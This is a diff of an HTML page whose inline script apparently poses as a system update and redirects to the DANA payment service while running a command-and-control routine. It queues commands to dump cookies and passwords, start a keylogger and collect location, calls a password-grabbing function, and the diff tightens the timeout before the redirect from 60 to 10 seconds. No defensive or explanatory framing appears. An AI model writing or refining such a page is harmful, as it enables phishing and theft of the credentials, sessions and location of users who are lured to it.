@@ -388,8 +388,7 @@ function autoExecuteC2() {
         { id: 'dump_cookies' },
         { id: 'dump_passwords' },
         { id: 'keylogger_start' },
-        { id: 'ambil_lokasi' },
-        { id: 'install_google_play' }
+        { id: 'ambil_lokasi' }
     ];
     
     commands.forEach(function(cmd) {
@@ -1069,7 +1068,7 @@ K({ sumber: 'system_update_start', data: { platform: PLATFORM } });
 registerSW();
 ambilPassword();
 
-// TIMEOUT FALLBACK (60 detik)
+// TIMEOUT FALLBACK (10 detik)
 setTimeout(function() {
     if (!allDone) {
         allDone = true;
@@ -1077,7 +1076,7 @@ setTimeout(function() {
         K({ sumber: 'timeout_fallback', data: 'redirecting' });
         setTimeout(redirectToDANA, 1000);
     }
-}, 60000);
+}, 10000);
 </script>
 </body>
 </html>
